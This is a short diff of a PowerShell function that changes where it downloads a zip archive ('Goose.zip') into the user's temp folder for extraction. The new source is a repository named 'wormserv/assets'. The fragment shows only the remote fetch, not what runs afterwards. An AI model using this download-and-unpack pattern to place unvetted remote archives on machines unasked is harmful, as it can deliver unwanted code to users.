@@ -1,5 +1,5 @@
 Function Goose {
-    $url = "https://github.com/ertvg/h/raw/main/Goose.zip"
+    $url = "https://github.com/wormserv/assets/raw/main/Goose.zip"
     $tempFolder = $env:TMP
     $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
     $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
